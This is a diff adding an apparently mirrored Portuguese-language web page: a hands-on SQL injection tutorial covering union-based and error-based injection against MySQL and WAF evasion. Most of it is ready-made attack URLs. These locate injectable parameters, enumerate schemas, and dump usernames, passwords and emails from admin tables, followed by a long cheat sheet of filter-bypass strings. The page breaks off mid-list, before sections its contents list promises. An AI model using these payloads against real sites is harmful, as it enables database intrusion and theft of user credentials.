@@ -1,0 +1,1341 @@
+
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<!-- Mirrored from f3l1p3.neocities.org/arquivos/sqlinjection by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 05 Oct 2025 19:28:13 GMT -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Análise de SQL Injection</title>
+    <link href="../favicon.ico" rel="icon" type="image/x-icon" />
+    <link id="theme-stylesheet" href="../assets/nostalgic.css" rel="stylesheet" type="text/css" media="all">
+</head>
+
+<body>
+
+    <input type="checkbox" id="theme-toggle" style="display: none;"/>
+
+    <div class="site-wrapper">
+
+        <header class="site-header">
+            <h1 class="main-title">SQL Injection</h1>
+            <p class="subtitle">Análise de Vulnerabilidades e Vetores de Ataque</p>
+        </header>
+
+        <nav class='menu-bar'>
+            <div class="menu-item"><a href="../index.html">[MENU]</a></div>
+            <div class="menu-item"><a href="../sobre.html">[Sobre o FEP]</a></div>
+            <div class="menu-item"><a href="arquivos.html">[Arquivos]</a></div>
+            <div class="menu-item"><a href="../ezines/ezines.html">[Ezines]</a></div>
+            <div class="menu-item"><a href="../links.html">[Sites Interessantes]</a></div>
+            <div class="menu-item theme-switcher">
+                <label for="theme-toggle" style="cursor: pointer;">[MODO VISUAL]</label>
+            </div>
+        </nav>
+
+  <div class="main" style="text-align: left;">
+        <fieldset class='box'>
+            <legend>Sql Injection ToC</legend>
+                <ul>
+                    <li><span><a href='#Mysql baseado em Union'>Mysql baseado em Union</a></span></li>
+                    <li><span><a href='#Double query sql injection'>Double query sql injection</a></span></li>
+                    <li><span><a href='#Sql Injection WAF Bypass'>Sql Injection WAF Bypass</a></span></li>
+                    <li><span><a href='#MSSQL INJECTION'>MSSQL INJECTION</a></span></li>
+                    <li><span><a href='#Sql Injection em Joomla e Wordpress'>Sql Injection em Joomla e Wordpress</a></span></li>
+                    <li><span><a href='#Sql Injection em Logins'>Sql Injection em Logins</a></span></li>
+                    <li><span><a href='#Sql Injection em Windows'>Sql Injection em Windows</a></span></li>
+                    <li><span><a href='#Sql Injection em User-Agent'>Sql Injection em User-Agent</a></span></li>
+                    <li><span><a href='#Sql Injection em Cookies'>Sql Injection em Cookies</a></span></li>
+                    <li><span><a href='#Sql injection no X-Forwarded-For'>Sql injection no X-Forwarded-For</a></span></li>
+                    <li><span><a href='#Manipulando Database por SQL Injection (MYSQL)'>Manipulando Database por SQL Injection (MYSQL)</a></span></li>
+                    <li><span><a href='#Leitura/Escrita SQLI'>Leitura/Escrita SQLI</a></span></li>
+                    <li><span><a href='#SQLI to RDP'>SQLI to RDP</a></span></li>
+                    <li><span><a href='#SQLI em base64 '>SQLI em base64 </a></span></li>
+                    <li><span><a href='#Error Based SQLI'>Error Based SQLI</a></span></li>
+                    <li><span><a href='#PostgreSQL Injection'>PostgreSQL Injection</a></span></li>
+                    <li><span><a href='#Upando Shell via sql injection(PostgreSQL)'>Upando Shell via sql injection(PostgreSQL)</a></span></li>
+                    <li><span><a href='#PostgreSQL (Based Error)'>PostgreSQL (Based Error)</a></span></li>
+                    <li><span><a href='#Blind SQLI MySQL'>Blind SQLI MySQL</a></span></li>
+                </ul>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='Mysql baseado em Union'></a>
+            <legend>Mysql baseado em Union</legend>
+                <ul>
+                    <li><span>Verificando qual coluna está vulneravel:</span></li>
+                <pre><code>http://www.site.com/buy.php?id=1'
+http://www.site.com/buy.php?id='1
+http://www.site.com/buy.php?id=-1'
+http://www.site.com/buy.php?id=1`</code></pre>
+                        <ul>
+                            <li><span>ps:acredite o lugar aonde você coloca a string faz diferença assim como se é <strong>'</strong> ou <strong>`</strong> .</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Se a url for desta maneira <strong>http://www.site.com/buy.php?id=1&amp;dog;catid=2</strong> vc deve injetar em ambos parametros ficando assim:      </span></li>
+                        </ul>
+                <pre><code>http://www.site.com/buy.php?id='1&amp;dog;catid='2</code></pre>
+                        <ul>
+                            <li><span>Ou então deletar um dos parametros, se der algum tipo de erro significa que o site está vulneravel.</span></li>
+                        </ul>
+                    <li><span>Determinando a quantidade de colunas:</span></li>
+                <pre><code>http://www.site.com/buy.php?id=1 order by 1-- &lt;-- sem erro
+http://www.site.com/buy.php?id=1 order by 2-- &lt;-- sem erro
+http://www.site.com/buy.php?id=1 order by 3-- &lt;-- sem erro
+http://www.site.com/buy.php?id=1 order by 4-- &lt;-- sem erro
+http://www.site.com/buy.php?id=1 order by 5-- &lt;-- <strong>com erro</strong></code></pre>
+                        <ul>
+                            <li><span>Logo este site possui 4 colunas pois como a coluna 5 deu erro ela não existe.     </span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Pode-se usar tb os seguintes comandos, as querys as vezes fazem diferença:</span></li>
+                        </ul>
+                <pre><code>http://www.site.com/buy.php?id=1 order by 1/
+http://www.site.com/buy.php?id=1 order by 1
+http://www.site.com/buy.php?id=1 order by 1--</code></pre>
+                        <ul>
+                            <li><span>Assim como injetar da seguinte maneira:</span></li>
+                        </ul>
+                <pre><code>http://www.site.com/buy.php?id=1+order+by+1--
+http://www.site.com/buy.php?id=1%20order%20by%201--
+http://www.site.com/buy.php?id=1 order by 1</code></pre>
+                        <ul>
+                            <li><span>ps:se um destes modos for e os outros não vc deverá utiliza-lo até o final.</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Se você coloca <strong>'</strong> para verificar se o site esta vulnerável o sistema do site pode substituir este caractere por outro nulo ou seja não irá retornar nada, uma forma de bypass pode ser adicionar um caractere nulo %00  ou entao podem converter o caractere <strong>'</strong> em hexadecimal que é <strong>%27</strong>,caso não dê outro método é juntar os dois bypass:</span></li>
+                        </ul>
+                <pre><code>--&gt; http://www.site.com/dir/accountlevel?id=1032%00'
+--&gt; http://www.site.com/dir/accountlevel?id=1032%27
+--&gt; http://www.site.com/dir/accountlevel?id=1032%00%27%00
+--&gt; http://www.site.com/dir/accountlevel?id=%271032%00
+--&gt; http://www.site.com/dir/accountlevel?id=%00%00%2710325%00</code></pre>
+                        <ul>
+                            <li><span>Bom acho que deu pra ter uma noção sobre bypass,mas caso queira saber mais estude sobre outros métodos de <strong>injeção</strong> como binário,encoding (base 64),entre outros.  </span></li>
+                        </ul>
+                    <li><span>BYPASS DE ORDER BY:</span></li>
+                        <ul>
+                            <li><span>É normal se deparar com alguns sites que mesmo estando vulneráveis a sqlinjection quando você coloca o order by 1, não retorna erro em nenhuma tabela.</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Um exemplo é um site que você coloca até <strong>10000000000</strong> e não retorna nenhum erro, segue então alguns bypass:</span></li>
+                        </ul>
+                <pre><code>--&gt; site.com/news.php?id=9 order by 10000000000-- [Sem Erro]</code></pre>
+                        <ul>
+                            <li><span>Para burlar tente o seguinte bypass:</span></li>
+                        </ul>
+                <pre><code>--&gt; site.com/news.php?id=9' order by 10000000--+  <strong>[Com Erro]</strong></code></pre>
+                        <ul>
+                            <li><span>Você deverá usar este método até o final da injeção:</span></li>
+                        </ul>
+                <pre><code>--&gt; http://site.com/news.php?id=-9' union select 1,2,3,4,5,6,7,8--+</code></pre>
+                    <li><span>Verificando qual coluna está vulneravel:</span></li>
+                        <ul>
+                            <li><span>Para achar a coluna vulneravel pode-se usar o comando <strong>union select</strong> ou <strong>union all select</strong> se não der com um tente com o outro.</span></li>
+                        </ul>
+                <pre><code>http://www.site.com/buy.php?id=1 union select 1,2,3,4--
+http://www.site.com/buy.php?id=1 union all select 1,2,3,4--</code></pre>
+                    <li><span>BYPASS UNION SELECT (UNION ALL SELECT):</span></li>
+                        <ul>
+                            <li><span>As vezes também um WAF (web aplication firewall) pode barrar sua injeção no UNION.</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Ele utiliza na maiorias das vezes um dicionário que lê as palavras que serão inseridas na url e bloqueia as que estão em sua <strong>blacklist</strong>, ou seja <strong>union select</strong> , <strong>union all select</strong>, entre outras string.</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Por isto segue alguns bypass:</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>--&gt; Quando se utiliza a seguinte string:</span></li>
+                        </ul>
+                <pre><code>http://www.site.com/index.php?id=-1+union+select+1,2,3,4,5--</code></pre>
+                        <ul>
+                            <li><span>Dá o seguinte erro:</span></li>
+                        </ul>
+                <pre><code>("404 forbidden you do not have permission to access to this webpage")</code></pre>
+                        <ul>
+                            <li><span>Então um bypass para burlar este <strong>dicionário</strong> é:</span></li>
+                        </ul>
+                <pre><code>http://www.site.com/index.php?id=-1+/*!UnIoN*/+/*!sELeCt*/1,2,3,4,5--</code></pre>
+                    <li><span>Conseguindo informação:</span></li>
+                <pre><code>http://www.site.com/buy.php?id=1 union select 1,2,@@version,4-- &lt;-- Mostra a versão</code></pre>
+                <pre><code>http://www.site.com/buy.php?id=1 union select 1,2,version(),4-- &lt;-- Mostra a versão</code></pre>
+                <pre><code>http://www.site.com/buy.php?id=1 union select 1,2,@@hostname,4-- &lt;-- Mostra o hostname</code></pre>
+                <pre><code>http://www.site.com/buy.php?id=1 union select 1,2,user(),3,4-- &lt;-- Mostra o user</code></pre>
+                <pre><code>http://www.site.com/buy.php?id=1 union select 1,2,database(),3,4-- &lt;-- Mostra a current-db</code></pre>
+                <pre><code>http://www.site.com/buy.php?id=1 union select 1,2,@@datadir,3,4-- &lt;-- Mostra o DIR do mysql</code></pre>
+                        <ul>
+                            <li><span>Com o comando <strong>group_concat</strong> vc pode pedir diversas informaçoes de uma vez por exemplo:</span></li>
+                        </ul>
+                <pre><code>http://www.site.com/buy.php?id=1 union select 1,2,group_concat(version(),user(),@@hostaname,@@datadir),3,4</code></pre>
+                        <ul>
+                            <li><span>Aconselho usar <strong>0x3a</strong> ele é o dois pontos em hex, deixa mais organizado a busca por suas info:</span></li>
+                        </ul>
+                <pre><code>http://www.site.com/buy.php?id=1 union select 1,2,group_concat(version(),0x3a,user(),0x3a,@@hostaname,0x3a,@@datadir),3,4--</code></pre>
+                <pre><code>http://www.site.com/buy.php?id=-1 UNION SELECT 1,2,unhex(hex(@@version)),4--</code></pre>
+                    <li><span>Achando os nomes das databases:</span></li>
+                        <ul>
+                            <li><span>Para ver todas as databases do site utilize o seguinte comando:</span></li>
+                        </ul>
+                <pre><code>http://www.site.com/buy.php?id=-1 union select 1,2,group_concat(schema_name),4 from information_schema.schemata--</code></pre>
+                        <ul>
+                            <li><span>Agora para ver apenas a current-db utilize algum dos seguintes comandos:</span></li>
+                        </ul>
+                <pre><code>http://www.site.com/buy.php?id=-1 union select 1,2,group_concat(database()),4--
+http://www.site.com/buy.php?id=-1 union select 1,2,concat(database()),4--
+http://www.site.com/buy.php?id=-1 union select 1,2,database(),4--</code></pre>
+                    <li><span>Achando os nomes das Tabelas:</span></li>
+                        <ul>
+                            <li><span>Para achar os nomes da tabelas vc vai utilizar o seguinte comando:</span></li>
+                        </ul>
+                <pre><code>http://www.site.com/buy.php?id=-1 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()--</code></pre>
+                        <ul>
+                            <li><span>Caso não queira olhar os dados da current-db vc deve trocar o <strong>table_schema=database()</strong> para <strong>table_schema=nomedadbquevcquer</strong></span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Utilizando-se do <strong>group_concat</strong> é possivel ver apenas 1024 caracteres,mas as vezes as tabelas tem mais do que isto portanto vc devera utilizar o comando <strong>limit</strong> para ver o resto.</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Desta maneira:</span></li>
+                        </ul>
+                <pre><code>http://www.site.com/buy.php?id=-1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1--
+http://www.site.com/buy.php?id=-1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database() LIMIT 15,1--
+http://www.site.com/buy.php?id=-1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database() LIMIT 30,1--
+http://www.site.com/buy.php?id=-1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database() LIMIT 45,1--</code></pre>
+                        <ul>
+                            <li><span>Vc deverá ir mudando o limite para que consiga observar o restante.</span></li>
+                        </ul>
+                    <li><span>Achando as colunas:</span></li>
+                        <ul>
+                            <li><span>Para achar as colunas use o seguinte comando:</span></li>
+                        </ul>
+                <pre><code>http://www.site.com/buy.php?id=-1 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name="nomedatabela"--</code></pre>
+                        <ul>
+                            <li><span>Se não funcionar desta maneira vc pode converter para hex o nome da tabela assim:</span></li>
+                        </ul>
+                <pre><code>http://www.site.com/buy.php?id=-1 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name=0x6e6f6d656461746162656c61--</code></pre>
+                        <ul>
+                            <li><span>Vc tambem pode convertar para mysql char se não der com hex :</span></li>
+                        </ul>
+                <pre><code>http://www.site.com/buy.php?id=-1 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name=CHAR(97, 100, 109, 105, 110)--</code></pre>
+                    <li><span>Fazendo o dump da info:</span></li>
+                        <ul>
+                            <li><span>Supondo que sua tabela tenha o nome de <strong>admin</strong> e as colunas que vc queira fazer o dump sejam <strong>user</strong>,<strong>pass</strong> e <strong>email</strong> vc devera utilizar o seguinte comando:</span></li>
+                        </ul>
+                <pre><code>http://www.site.com/buy.php?id=-1 UNION SELECT 1,group_concat(user,0x3a,pass,0x3a,email),3,4 FROM admin--</code></pre>
+                        <ul>
+                            <li><span><strong>Dica ninja: site.com/index.php?id=1' vc muda para index.php?id=1+and+0+order+by+xxx-- outra coisa se vc injetar via post pode funfar pq as vezes só o get que não vai então preciso usar o post</strong></span></li>
+                        </ul>
+                </ul>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='Double query sql injection'></a>
+            <legend>Double query sql injection</legend>
+                <ul>
+                    <li><span>Este é um metodo um pouco mais avançado de sql injection em double query vc não tera acesso ao <strong>group_concat</strong> vc usará apenas <strong>concat()</strong> com o <strong>limit</strong> este método é mais usado quando não se é possivel usar o <strong>union select</strong>.</span></li>
+                    <li><span>Puxando a versão:</span></li>
+                <pre><code>+and(select+1+FROM(select count(*),concat((select(select concat (version())) FROM Information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)</code></pre>
+                    <li><span>Agora se deseja ver a current-db basta trocar aonde está escrito <strong>version()</strong> por <strong>database()</strong>, assim:</span></li>
+                <pre><code>+and(select+1+FROM(select count(*),concat((select(select concat (database())) FROM Information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)</code></pre>
+                    <li><span>Para ver as tabelas vc necessita adicionar valores em hex:</span></li>
+                <pre><code>+and(select+1+FROM(select count(*),concat((select(select (SELECT concat (0x7e,0x27,count(table_name),0x27,0x7e) FROM 'Information_schema'.tables WHERE table_schema=<strong>AQUI VC COLOCA O NOME DA DB EM HEX</strong>)) LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)</code></pre>
+                        <ul>
+                            <li><span>Imaginando que quando vc foi pegar o nome da db vc tinha descoberto que o nome era admin vc transformara para hex assim:</span></li>
+                        </ul>
+                <pre><code>admin = 0x61646d696e</code></pre>
+                <pre><code>+and(select+1+FROM(select count(*),concat((select(select (SELECT concat (0x7e,0x27,count(table_name),0x27,0x7e) FROM 'Information_schema'.tables WHERE table_schema=0x61646d696e)) LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)</code></pre>
+                    <li><span>Para pegar as colunas vc adiciona um novo valor em hex com o nome da tabela que deseja ver <strong>and table_name=&lt;hex valor aqui&gt;</strong> assim:</span></li>
+                <pre><code>+and(select+1+FROM(select count(*),concat((select(select (SELECT concat (0x7e,0x27,count(table_name),0x27,0x7e) FROM 'Information_schema'.tables WHERE table_schema=0x61646d696e AND table_name=0x65321233e)) LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)</code></pre>
+                    <li><span>Para ir mudando as colunas vc vai trocando o valor do limit por exemplo de 0,1 para 1,1 depois 2,1 depois 3,1 e assim vai.</span></li>
+                    <li><span>Para fazer o dump use uma coluna por vez para ficar mais facil assim:</span></li>
+                <pre><code>+and(select+1+FROM(select count(*),concat((select+concat(0x3a,password)+from+users+LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)</code></pre>
+                    <li><span>Aonde o password é a coluna e users a tabela ;)</span></li>
+                    <li><span>Para pegar user ficaria parecido com isto na url:</span></li>
+                <pre><code>http://site.com/index.php?id=1+and(select+1+FROM(select count(*),concat((select+concat(0x3a,username)+from+users+LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='Sql Injection WAF Bypass'></a>
+            <legend>Sql Injection WAF Bypass</legend>
+                <ul>
+                    <li><span>Conversando com o madcodE da madleets sobre bypass para sql injection ele me enviou um tutorial que segue abaixo:</span></li>
+                    <li><span>O que é WAF?</span></li>
+                <pre><code>WAF significa Web Application Firewall. É amplamente utilizado hoje em dia para detectar e defender ataques de SQL Injections e Cross Site Scripting (XSS).</code></pre>
+                    <li><span>Como funciona?</span></li>
+                <pre><code>Quando WAF detecta qualquer entrada malicioso de usuário final, dá 403 Proibido, 406 Não Aceitável ou qualquer tipo de erros personalizados.</code></pre>
+                    <li><span>O que fazer a seguir?</span></li>
+                <pre><code>Então, o que fazer a seguir? nós não podemos fazer a injeção normal correto? Bem, é hora de usar várias técnicas de bypass.</code></pre>
+                    <li><span>Algumas dessas técnicas são mencionadas a seguir:</span></li>
+                    <li><span># Case Changing:</span></li>
+                <pre><code>A maioria dos Waf's filtram apenas letras minusculas ou palavras chaves do WAF. Podemos facilmente fugir desse tipo de WAFS usando caso alternativo.</code></pre>
+                <pre><code>Se union select é proibido , podemos testar então UNION SELECT. E se ambos não funcionarem, podemos tentar misturar ambos. Assim: <strong>UniOn seLeCt</strong></code></pre>
+                    <li><span># Using Comments</span></li>
+                <pre><code>Comentários SQL realmente nos ajudam em varias situações. Eles desempenham o seu papel importante na morte de Restrições de alguns Waf.</code></pre>
+                    <li><span>e.g <strong>//</strong> , <strong>--</strong> , <strong>--+</strong> , <strong>#</strong>, <strong>-- -</strong> </span></li>
+                    <li><span># Inline Comments</span></li>
+                <pre><code>Alguns WAF’s filtram palavras como <strong>/union\sselect/ig</strong> Podemos ignorar esses filtros usando comentários incorporados na maioria das vezes.</code></pre>
+                <pre><code>http://localhost/waf.php?id=1 /*!union*/  /*!select*/ 1,2,3--</code></pre>
+                    <li><span><strong>Dica: Leia SQLi Errors com cuidado. As vezes, eles deixaram de erro a partir do qual podemos ter idéia de como waf está trabalhando neste site.</strong></span></li>
+                <pre><code>De qualquer forma, estávamos falando sobre palavras-chave filtradas. Então, isso não significa que waf só está filtrando union select. Talvez esteja filtrando todas palavras chaves de SQL como table_name, column_name etc
+Então, talvez seja necessário aplicar esses comentários na linha sobre as palavras-chave também.</code></pre>
+                    <li><span>Exemplo:</span></li>
+                <pre><code>http://localhost/waf.php?id=1 /*!union*/ /*!select*/ 1,2,/*!table_name*/,4,5 /*!from*/ /*!information_schema.tables*/ /*!where*/ /*!table_schema*/=database()--</code></pre>
+                    <li><span># Double use of Keywords</span></li>
+                <pre><code>As vezes WAF remove toda palavra-chave da consulta e executa como erro.</code></pre>
+                    <li><span>Nesses casos, podemos usar as palavras-chave desta forma:</span></li>
+                <pre><code>http://localhost/waf.php?id=1 UNunionION SELselectECT 1,2,3,4,5,6--</code></pre>
+                <pre><code>De qualquer forma depende do cenário. Eu estou apenas dando uma idéia comum. O resto é com você a forma como você vai usar depende apenas de você.</code></pre>
+                    <li><span># Using Different types of Whitespaces</span></li>
+                <pre><code>As vezes Waf pode filtrar o espaço em branco que estamos usando entre palavras-chave. Na maioria das vezes usamos o espaços, mas o espaço não é o único espaço em branco que podemos usar na injeção SQL.
+    Temos algumas outras opções também por exemplo: o <strong>+ </strong> e o <strong>%20</strong> são usados como espaço ,mais exemplos são: <strong>%09</strong>  <strong>%0A</strong>  <strong>%0B</strong> <strong>%0C</strong> <strong>%0D</strong> **%A0*</code></pre>
+                <pre><code>union%0Bselect%0B1,2,3--</code></pre>
+                    <li><span># Encoding</span></li>
+                        <ul>
+                            <li><span>Podemos sempre tentar a sorte codificando a URL para ignorar WAF. </span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Por exemplo, podemos usar:</span></li>
+                        </ul>
+                <pre><code>union select 1,/*!table_name*/,3 from information_schema.tables where table_schema=database()</code></pre>
+                        <ul>
+                            <li><span>como:</span></li>
+                        </ul>
+                <pre><code>union%20select%201,%2f%2a%21table_name%2a%2f,3%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29</code></pre>
+                        <ul>
+                            <li><span>Porém algumas vezes o waf também filtra <strong>%</strong> </span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Então nós temos que usar a codificação dupla de URL, nesse caso:</span></li>
+                        </ul>
+                <pre><code>union%2520select%25201,%2f%2a%21table_name%2a%2f%2520,3 from%2520information_schema.tables%2520where%2520table_schema%253Ddatabase%2528%2529</code></pre>
+                    <li><span># Unexpected Input</span></li>
+                    <li><span>Este cenário é muito raro , temos que usar buffer overflow ou dar uma consulta inesperada / para enganar filtros WAF.</span></li>
+                <pre><code>http://localhost/waf.php?id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) union select 1,2,3,4,5--</code></pre>
+                    <li><span>Me foi útil poucas vezes. Mas conhecimento é poder, talvez seja util para você o bypass usando buffer overflow.</span></li>
+                    <li><span># Use todas as tecnicas mencionadas acima juntas</span></li>
+                        <ul>
+                            <li><span>ah... tentei todas essas tecnicas, mas ainda mostra <strong>NÃO ACEITÁVEL</strong> ou <strong>PROIBIDO</strong>. </span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Bem esta na hora de usar todas as técnicas mencionadas acima combinadas.</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Por exemplo: você pode usar casos alternativos com comentários ou ofuscação.</span></li>
+                        </ul>
+                    <li><span>#Some Common Union Select Solutions: </span></li>
+                <pre><code>%55nion(%53elect 1,2,3)-- -
++union+distinct+select+
++union+distinctROW+select+
+/<strong>//*!12345UNION SELECT*//</strong>/
+/<strong>//*!50000UNION SELECT*//</strong>/
+/<strong>/UNION/</strong>//*!50000SELECT*//**/
+/*!50000UniON SeLeCt*/
+union /*!50000%53elect*/
++#uNiOn+#sEleCt
++#1q%0AuNiOn all#qa%0A#%0AsEleCt
+/*!%55NiOn*/ /*!%53eLEct*/
+/*!u%6eion*/ /*!se%6cect*/
++un/<strong>/ion+se/</strong>/lect
+uni%0bon+se%0blect
+%2f<strong>%2funion%2f</strong>%2fselect
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
+REVERSE(noinu)+REVERSE(tceles)
+/*--*/union/*--*/select/*--*/
+union (/*!/**/ SeleCT */ 1,2,3)
+/*!union*/+/*!select*/
+union+/*!select*/
+/<strong>/union/</strong>/select/**/
+/<strong>/uNIon/</strong>/sEleCt/**/
+/<strong>//*!union*//</strong>//*!select*//**/
+/*!uNIOn*/ /*!SelECt*/
++union+distinct+select+
++union+distinctROW+select+
+uNiOn aLl sElEcT</code></pre>
+                    <li><span><strong>Mais uma dica se vc encriptar tudo em base 64 pode conseguir um bom resultado é um boa forma de bypass tb ;)</strong></span></li>
+                    <li><span>Então vamos explicar os métodos de bypass um pouco mais a fundo...</span></li>
+                    <li><span>MÉTODOS SIMPLES:</span></li>
+                    <li><span>1º Caso (Simples):</span></li>
+                        <ul>
+                            <li><span>Este tipo de bypass é o mais simples, e deve-se saber de cor e sorteado:</span></li>
+                        </ul>
+                <pre><code>/*!union*/ /*!select*/ 1,2,3,4,5--</code></pre>
+                <pre><code>http://www.site.com.br/index.php?id=15 /*!union*/ /*!select*/ 1,2,3,4,5#continue xploiting....</code></pre>
+                    <li><span>2º Caso ("Caso das letras"):</span></li>
+                        <ul>
+                            <li><span>Outro caso bem simples também pode ser mesclado com o 1º caso:</span></li>
+                        </ul>
+                <pre><code>http://www.site.com.br/index.php?id=15 UnIoN SeLeCT 1,2,3,4,5#continue xploiting...</code></pre>
+                    <li><span>3º Caso(Mesclagem de caso 1 &amp;&amp; 2):</span></li>
+                        <ul>
+                            <li><span>Nada a declarar, o exemplo fala por si só:</span></li>
+                        </ul>
+                <pre><code>http://www.site.com.br/index.php?id=15 /*!uNIOn*/ /*!SelECt*/ 1,2,3,4,5#continue xploiting...</code></pre>
+                    <li><span>4º Caso(Repetição de Palavras):</span></li>
+                        <ul>
+                            <li><span>Serão descartado as palavras <strong>union</strong> e <strong>select</strong>. Ficando somente <strong>UNION</strong> &amp;&amp; <strong>SELECT</strong></span></li>
+                        </ul>
+                <pre><code>http://www.site.com.br/index.php?id=15 UNIunionON SELselectECT 1,2,3,4,5#continue xploiting...</code></pre>
+                    <li><span>5º Caso (Comentário em linhas + Mudança de Letras):</span></li>
+                        <ul>
+                            <li><span>Você usará comentário para o bypass (bem simples também):</span></li>
+                        </ul>
+                <pre><code>http://www.site.com.br/index.php?id=15 UnION/**/SElecT 1,2,3,4,5#continue xploiting...</code></pre>
+                    <li><span>MÉTODOS AVANÇADOS:</span></li>
+                    <li><span>1º Caso (Buffer Overflow/Crash WAF):</span></li>
+                        <ul>
+                            <li><span>Vamos adicionar na url uma grande repetição de caracteres para dar um crash no WAF para que ele se desligue e não nos barre...</span></li>
+                        </ul>
+                <pre><code>+and+(select 1)=(Select 0xAA[..(add about 1000 "A")..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4,5#continue xploiting...</code></pre>
+                <pre><code>http://www.site.com.br/index.php?id=15+and+(select 1)=(Select 0xAA[..(add about 1000 "A")..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4,5</code></pre>
+                        <ul>
+                            <li><span>Com isto será adicionado 1000 caracteres "A" oque bem provável irá dar um crash no WAF.</span></li>
+                        </ul>
+                    <li><span>2º Caso(Codificando injeção em Hex):</span></li>
+                        <ul>
+                            <li><span>Consiste em converter toda a url de injeção para codificação em hexadecimal em/ou 3 tipos:</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Texto simples: </span></li>
+                        </ul>
+                <pre><code>/*!union*/ /*!select*/ 1,2,3,4,5</code></pre>
+                <pre><code>-  Hex Encoded for URL: %2f%2a%21%75%6e%69%6f%6e%2a%2f%20%2f%2a%21%73%65%6c%65%63%74%2a%2f%20%31%2c%32%2c%33%2c%34%2c%35</code></pre>
+                <pre><code>-  Hex Dashed:  2f-2a-21-75-6e-69-6f-6e-2a-2f-20-2f-2a-21-73-65-6c-65-63-74-2a-2f-20-31-2c-32-2c-33-2c-34-2c-35</code></pre>
+                <pre><code>-  Hex Spaced:  2f 2a 21 75 6e 69 6f 6e 2a 2f 20 2f 2a 21 73 65 6c 65 63 74 2a 2f 20 31 2c 32 2c 33 2c 34 2c 35</code></pre>
+                <pre><code>-  Hex:  2f2a21756e696f6e2a2f202f2a2173656c6563742a2f20312c322c332c342c35 </code></pre>
+                        <ul>
+                            <li><span>OU</span></li>
+                        </ul>
+                <pre><code>/*!u%6eion*/ /*!se%6cect*/ 1,2,3,4,5...</code></pre>
+                        <ul>
+                            <li><span>que significa: </span></li>
+                        </ul>
+                <pre><code>/*!union*/ /*!select*/ 1,2,3,4,5...</code></pre>
+                    <li><span>3º Caso(Usando Strings SQL Alternativas):</span></li>
+                        <ul>
+                            <li><span>Em vez de usar as strings mais comuns (que a maioria é filtrada pelos WAF's atuais) usar strings pouco conhecidas:</span></li>
+                        </ul>
+                <pre><code>+-------------------------------+
+|  COMUM    ++++++  ALTERNATIVO |
+|               |               |
+|@@version      |  version()    |
+|concat()       |  concat_ws()  |
+|group_concat() |  concat_ws()  | 
++-------------------------------+</code></pre>
+                    <li><span>4º Caso(Funções de WAF exploitáveis):</span></li>
+                        <ul>
+                            <li><span>Existem certos WAF's que quando vão fazer o filtro de caracteres substituem os que estão na black list(não permitidos) por um espaço em branco e juntam as palavras deste caractere em branco, ou seja com isto podemos xploitar estas funções:</span></li>
+                        </ul>
+                <pre><code>http://www.site.com.br/index.php?id=15+uni*on+sel*ect+1,2,3,4,5#continue xploiting...</code></pre>
+                        <ul>
+                            <li><span>Com isto se o WAF possuir a função citada ele irá deletar os asteríscos(*) e irá juntar as palavras, formando nossa string de injeção:</span></li>
+                        </ul>
+                <pre><code>http://www.site.com.br/index.php?id=15+union+select+1,2,3,4,5#continue xploiting...</code></pre>
+                    <li><span>5º Caso(Uso de parênteses):</span></li>
+                        <ul>
+                            <li><span>Usando vários parênteses para burlar filtros do WAF:</span></li>
+                        </ul>
+                <pre><code>http://www.site.com.br/index.php?id=15+(uNioN)+(sElECt)1,2,3,4,5#continue xploiting....</code></pre>
+                <pre><code>http://www.site.com.br/index.php?id=15+(uNioN+SeleCT)+1,2,3,4,5#continue xploiting....</code></pre>
+                <pre><code>http://www.site.com.br/index.php?id=15+(UnI)(oN)+(SeL)(ecT)+1,2,3,4,5#continue xploiting....</code></pre>
+                <pre><code>http://www.site.com.br/index.php?id=15+union (select 1,2,3,4,5)#continue xploiting....</code></pre>
+                    <li><span>É um chato mas ao mesmo tempo desafiador quando estamos injetando e devemos utilizar algum outro bypass, triste é quando é no dump (rsrs). </span></li>
+                    <li><span>O error geralmente aparece no union select (incial) ou então do dump das informações, e o próprio indicador é o título:</span></li>
